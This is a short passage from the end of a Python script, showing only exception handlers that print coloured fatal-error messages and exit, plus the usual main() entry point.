            print(f"\n\n\033[38;5;196m[!] FATAL ERROR: {str(e)} [!]\033[0m")
            sys.exit(1)
            
    except Exception as e:
        print(f"\n\n\033[38;5;196m[!] SYSTEM ERROR: {str(e)} [!]\033[0m")
        sys.exit(1)

if __name__ == "__main__":
    main()